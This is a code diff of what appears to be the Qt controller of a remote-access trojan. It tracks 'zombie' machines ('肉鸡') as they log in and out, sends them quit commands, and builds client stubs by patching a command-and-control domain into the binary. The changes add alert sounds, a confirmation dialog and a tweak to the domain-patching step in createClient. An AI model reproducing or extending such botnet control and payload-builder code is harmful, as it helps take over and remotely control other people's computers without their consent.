@@ -6,6 +6,9 @@ Widget::Widget(QWidget *parent) :
     QWidget(parent),
     ui(new Ui::Widget)
 {
+
+
+
     ui->setupUi(this);
 
     // 先设置窗口的头相，资源图片在上面下载
@@ -138,6 +141,9 @@ Widget::Widget(QWidget *parent) :
     connect(mZeroServer, SIGNAL(clientLogin(int,QString,QString,int,QString)),
             this, SLOT(addClientToTable(int,QString,QString,int,QString)));
     connect(mZeroServer, SIGNAL(clientLogout(int)), this, SLOT(removeClientFromTable(int)));
+
+
+
 }
 
 Widget::~Widget()
@@ -284,7 +290,15 @@ void Widget::rebootClicked()
 
 void Widget::quitClicked()
 {
+
+
     // 获取当前用户id
+    QMessageBox::question(this,
+                                  tr("问一哈"),
+                                  tr("真的要下线这台肉鸡吗"),
+                                  QMessageBox::Yes | QMessageBox::No,
+                                  QMessageBox::Yes);
+    qDebug()<<QDir::currentPath();
     int id = currentClientIdFromTable();
     if (id != -1)
     {
@@ -294,6 +308,10 @@ void Widget::quitClicked()
                               QMessageBox::Yes | QMessageBox::No,
                               QMessageBox::Yes))
         {
+            QSoundEffect *quit=new QSoundEffect(this);
+            quit->setSource(QUrl::fromLocalFile("://resources/wav/有主机下线请注意.wav"));  //主机下线音效
+            quit->play();
+
             ZeroClient *client = mZeroServer->client(id);
             client->sendQuit();
             qDebug() << "主人我下线了";
@@ -313,6 +331,13 @@ void Widget::aboutClicked()
 
 void Widget::addClientToTable(int id, QString name, QString ip, int port, QString systemInfo)
 {
+
+
+
+    QSoundEffect *login=new QSoundEffect(this);
+    login->setSource(QUrl::fromLocalFile("://resources/wav/有主机上线请注意.wav"));  //主机上线音效
+    login->play();
+
     int count = mClientTable->rowCount();
     mClientTable->setRowCount(count+1);
 
@@ -435,7 +460,7 @@ void Widget::createClient()
     domainPos += offsetDomain;
 
     QByteArray afterDomain;
-    afterDomain.append(mEditDomain->text());
+    afterDomain.append(mEditDomain->text()+" ");
     fileData.replace(domainPos, afterDomain.size(), afterDomain);
 
     // 自定义端口
